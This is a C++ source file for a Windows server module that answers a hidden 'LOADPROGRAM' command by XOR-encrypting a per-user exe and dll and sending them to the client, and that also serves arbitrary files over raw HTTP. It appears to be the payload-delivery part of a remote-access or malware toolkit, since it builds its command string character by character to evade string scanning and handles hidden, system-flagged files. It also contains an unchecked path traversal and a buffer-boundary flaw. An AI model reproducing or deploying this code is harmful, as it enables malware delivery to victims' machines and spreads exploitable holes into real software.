#include <windows.h>
#include <winsock.h>
#include "DownloadProgramRecver.h"
#include "main.h"
#include "Public.h"
#include <iostream>

using namespace std;

#pragma comment(lib,"ws2_32.lib")

#define CRYPT_KEY_SIZE 16




DWORD GetCryptKey(char* pKey)
{
	SYSTEMTIME stSystime = { 0 };
	GetSystemTime(&stSystime);

	DWORD dwTickCnt[CRYPT_KEY_SIZE / sizeof(DWORD)] = { 0 };
	for (int i = 0; i < CRYPT_KEY_SIZE / sizeof(DWORD); i++)
	{
		dwTickCnt[i] = GetTickCount();
	}

	char* pSystemTime = (char*)&stSystime;
	char* pTickCnt = (char*)dwTickCnt;
	for (int j = 0; j < CRYPT_KEY_SIZE; j++)
	{
		pKey[j] = pSystemTime[j] ^ pTickCnt[j];
	}

	//memset(pKey,0,16);
	return TRUE;
}



int CryptData(unsigned char* src, int srclen, unsigned char* dst, int dstlen, unsigned char* key) {

	for (int i = 0, j = 0; i < srclen; )
	{
		dst[i] = src[i] ^ key[j];
		j++;
		if (j >= CRYPT_KEY_SIZE)
		{
			j = 0;
		}
		i++;
	}
	return TRUE;
}



DWORD SendExeAndDllFile(NETWORKPROCPARAM stClientInfo, char* username, int bufSize) {
	int iRet = 0;
	char szDllFileName[MAX_PATH];
	char szExeFileName[MAX_PATH];
	char showbuf[1024];

	char szFindPath[MAX_PATH];
	GetCurrentDirectoryA(MAX_PATH, szFindPath);
	lstrcatA(szFindPath, "\\");
	lstrcatA(szFindPath, DOWNLOADPROGRAM_PATH);
	lstrcatA(szFindPath, "\\");
	lstrcatA(szFindPath, username);
	lstrcatA(szFindPath, "\\");

	char szAllExe[MAX_PATH];
	lstrcpyA(szAllExe, szFindPath);
	lstrcatA(szAllExe, "*.exe");
	WIN32_FIND_DATAA stExeFd = { 0 };
	HANDLE hFind = FindFirstFileA(szAllExe, (LPWIN32_FIND_DATAA)&stExeFd);
	if (hFind == INVALID_HANDLE_VALUE)
	{
		lstrcpyA(szAllExe, szFindPath);
		lstrcatA(szAllExe, "*.com");
		hFind = FindFirstFileA(szAllExe, (LPWIN32_FIND_DATAA)&stExeFd);
		if (hFind == INVALID_HANDLE_VALUE)
		{
			WriteLog("SendProgramToClient FindFirstFileA exe error\r\n");
			return FALSE;
		}
		else {
			lstrcpyA(szExeFileName, szFindPath);
			lstrcatA(szExeFileName, stExeFd.cFileName);
			FindClose(hFind);
		}
	}
	else {
		lstrcpyA(szExeFileName, szFindPath);
		lstrcatA(szExeFileName, stExeFd.cFileName);
		FindClose(hFind);
	}

	char szAllDll[MAX_PATH];
	lstrcpyA(szAllDll, szFindPath);
	lstrcatA(szAllDll, "*.dll");
	WIN32_FIND_DATAA stDllFd = { 0 };
	hFind = FindFirstFileA(szAllDll, (LPWIN32_FIND_DATAA)&stDllFd);
	if (hFind == INVALID_HANDLE_VALUE)
	{
		WriteLog("SendProgramToClient FindFirstFileA dll error\r\n");
		return FALSE;
	}
	else {
		lstrcpyA(szDllFileName, szFindPath);
		lstrcatA(szDllFileName, stDllFd.cFileName);
		FindClose(hFind);
	}

	HANDLE hFExe = CreateFileA(szExeFileName, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, 0);
	if (hFExe == INVALID_HANDLE_VALUE)
	{
		wsprintfA(showbuf, "SendProgramToClient create exe file:%s error code:%u\r\n", szExeFileName, GetLastError());
		WriteLog(showbuf);
		return FALSE;
	}
	DWORD dwExeFileSize = GetFileSize(hFExe, 0);

	HANDLE hFDll = CreateFileA(szDllFileName, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, 0);
	if (hFDll == INVALID_HANDLE_VALUE)
	{
		CloseHandle(hFExe);

		wsprintfA(showbuf, "SendProgramToClient create dll file:%s error\r\n", szDllFileName);
		WriteLog(showbuf);
		return FALSE;
	}
	DWORD dwDllFileSize = GetFileSize(hFDll, 0);

	int iTotalLen = sizeof(int) + sizeof(int) +
		sizeof(int) + lstrlenA(stExeFd.cFileName) + sizeof(int) + dwExeFileSize +
		sizeof(int) + lstrlenA(stDllFd.cFileName) + sizeof(int) + dwDllFileSize +
		CRYPT_KEY_SIZE;

	char* pFileBuf = new char[iTotalLen];
	char* pKey = pFileBuf + iTotalLen - CRYPT_KEY_SIZE;
	GetCryptKey(pKey);

	int Offset = 0;
	*(int*)(pFileBuf + Offset) = iTotalLen;
	Offset += sizeof(int);
	*(int*)(pFileBuf + Offset) = DOWNLOADPROGRAM;
	Offset += sizeof(int);
	*(int*)(pFileBuf + Offset) = lstrlenA(stExeFd.cFileName);
	Offset += sizeof(int);
	lstrcpyA(pFileBuf + Offset, stExeFd.cFileName);
	Offset += lstrlenA(stExeFd.cFileName);
	*(int*)(pFileBuf + Offset) = dwExeFileSize;
	Offset += sizeof(int);
	DWORD dwcnt = 0;
	iRet = ReadFile(hFExe, pFileBuf + Offset, dwExeFileSize, &dwcnt, 0);
	CloseHandle(hFExe);
	if (iRet <= 0) {
		wsprintfA(showbuf, "SendProgramToClient read exe file:%s error\r\n", szExeFileName);
		WriteLog(showbuf);

		CloseHandle(hFDll);
		delete[] pFileBuf;
		return FALSE;
	}

	CryptData((unsigned char*)pFileBuf + Offset, dwExeFileSize, (unsigned char*)pFileBuf + Offset, dwExeFileSize, (unsigned char*)pKey);
	Offset += dwExeFileSize;

	*(int*)(pFileBuf + Offset) = lstrlenA(stDllFd.cFileName);
	Offset += sizeof(int);
	lstrcpyA(pFileBuf + Offset, stDllFd.cFileName);
	Offset += lstrlenA(stDllFd.cFileName);
	*(int*)(pFileBuf + Offset) = dwDllFileSize;
	Offset += sizeof(int);

	iRet = ReadFile(hFDll, pFileBuf + Offset, dwDllFileSize, &dwcnt, 0);
	CloseHandle(hFDll);
	if (iRet <= 0) {
		delete[] pFileBuf;

		wsprintfA(showbuf, "SendProgramToClient read dll file:%s error\r\n", szDllFileName);
		WriteLog(showbuf);
		return FALSE;
	}

	CryptData((unsigned char*)pFileBuf + Offset, dwDllFileSize, (unsigned char*)pFileBuf + Offset, dwDllFileSize, (unsigned char*)pKey);
	Offset += dwDllFileSize;

	iRet = send(stClientInfo.hSockClient, pFileBuf, iTotalLen, 0);
	delete[] pFileBuf;

	if (iRet <= 0) {
		wsprintfA(showbuf, "SendProgramToClient read exe file:%s,size:%d,dll file:%s,size:%d error\r\n", szExeFileName, dwExeFileSize, szDllFileName, dwDllFileSize);
		WriteLog(showbuf);
		return FALSE;
	}
	else {
		wsprintfA(showbuf, "SendProgramToClient read exe file:%s,size:%d,dll file:%s,size:%d ok\r\n", szExeFileName, dwExeFileSize, szDllFileName, dwDllFileSize);
		WriteLog(showbuf);
		return TRUE;
	}
}







DWORD __stdcall SendProgramToClient(NETWORKPROCPARAM stClientInfo, char* pBuf, int bufSize)
{
	char szerror[1024];
	int ret = 0;

	int iRecvLen = recv(stClientInfo.hSockClient, pBuf, bufSize, 0);
	if (iRecvLen <= 0)
	{
		WriteLog("SendProgramToClient recv first packet error\r\n");
		return FALSE;
	}

	*(pBuf + iRecvLen) = 0;
	char szLoadProgramCmd[] = { 'L','O','A','D','P','R','O','G','R','A','M',0 };
	if (memcmp(pBuf, szLoadProgramCmd, lstrlenA(szLoadProgramCmd)) == 0)
	{
		string params = string(pBuf, bufSize);
		int pos = params.find(":");
		string username = "";
		if (pos >= 0)
		{
			username = params.substr(pos + 1);
		}

		ret = SendExeAndDllFile(stClientInfo, (char*)username.c_str(), 0);
		return ret;

	}
	else if (memcmp(pBuf, "GET /", 5) == 0 || memcmp(pBuf, "POST /", 6) == 0)
	{
		int start = 0;
		if (memcmp(pBuf, "GET /", 5) == 0)
		{
			start = 5;
		}
		else if (memcmp(pBuf, "POST /", 6) == 0)
		{
			start = 6;
		}
		string url = pBuf;
		int pos = url.find(" HTTP/1.1\r\n");
		if (pos <= 0 || pos - start <= 0)
		{
			wsprintfA(szerror, "SendProgramToClient parse url error\r\n");
			WriteLog(szerror);
			return FALSE;
		}

		string filename = url.substr(start, pos - start);

		char szfilepath[MAX_PATH];
		GetCurrentDirectoryA(MAX_PATH, szfilepath);
		lstrcatA(szfilepath, "\\");

		lstrcatA(szfilepath, DOWNLOADPROGRAM_PATH);
		lstrcatA(szfilepath, "\\");

		lstrcatA(szfilepath, filename.c_str());
		//windows support both / and \ int file path
		HANDLE hf = CreateFileA(szfilepath, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
		if (hf == INVALID_HANDLE_VALUE)
		{
			wsprintfA(szerror, "SendProgramToClient CreateFileA file:%s error\r\n", filename.c_str());
			WriteLog(szerror);
			return FALSE;
		}

		int filesize = GetFileSize(hf, 0);
		char* lpdata = new char[filesize + 4096];
		char* httphdr = lpdata;
		char* lpformat = 0;

		char szhttpechohdrText[] =
			"HTTP/1.1 200 OK\r\n"
			//"User-Agent: Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)\r\n"
			"Content-type: text/html;charset=UTF-8;q=0.8\r\n"
			"Content-Language: zh-CN;en-US\r\n"
			"Connection: keep-alive\r\n"
			"Content-Length: %u\r\n\r\n";
		char szhttpechohdrApp[] =
			"HTTP/1.1 200 OK\r\n"
			"Content-type: application/octet-stream;charset=utf-8;q=0.8\r\n"
			"Content-Language: zh-CN;en-US\r\n"
			"Connection: keep-alive\r\n"
			//"Content-Encoding: gzip/deflate\r\n"
			"Content-Length: %u\r\n\r\n";

		if (url.find(".exe") || url.find(".dll") || url.find(".com"))
		{
			lpformat = szhttpechohdrApp;
		}
		else {
			lpformat = szhttpechohdrText;
		}


		int hdrlen = wsprintfA(httphdr, lpformat, filesize);

		DWORD dwcnt = 0;
		ret = ReadFile(hf, lpdata + hdrlen, filesize, &dwcnt, 0);
		CloseHandle(hf);
		ret = send(stClientInfo.hSockClient, lpdata, hdrlen + filesize, 0);
		if (ret > 0)
		{
			wsprintfA(szerror, "SendProgramToClient send file:%s size:%u ok\r\n", filename.c_str(), filesize);
			WriteLog(szerror);
			return TRUE;
		}
		else
		{
			wsprintfA(szerror, "SendProgramToClient send file:%s size:%u error\r\n", filename.c_str(), filesize);
			WriteLog(szerror);
			return FALSE;
		}
		return TRUE;
	}
	else {
		WriteLog("SendProgramToClient unrecognized command\r\n");
		return FALSE;
	}

	return FALSE;
}



int __stdcall DownloadProgramRecver(LPNETWORKPROCPARAM pClientInfo) {
#define DOWNLOADPROGRAM_BUF_SIZE 0x1000
	NETWORKPROCPARAM stClientInfo = *pClientInfo;

	char pBuf[DOWNLOADPROGRAM_BUF_SIZE];
	int bufSize = DOWNLOADPROGRAM_BUF_SIZE;
	int ret = SendProgramToClient(stClientInfo, pBuf, bufSize);

	closesocket(stClientInfo.hSockClient);
	return ret;
}








